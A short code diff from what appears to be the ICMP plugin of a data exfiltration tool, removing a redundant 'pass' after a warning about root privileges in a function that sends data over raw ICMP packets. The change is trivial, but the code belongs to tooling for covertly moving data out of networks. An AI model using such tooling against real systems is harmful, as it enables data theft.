@@ -24,7 +24,6 @@ def send_icmp(dst, data):
         s.sendto(icmp_pkt.pack(), (ip_dst, 0))
     except:
         app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
-        pass
     s.close()
 
 def send(data):
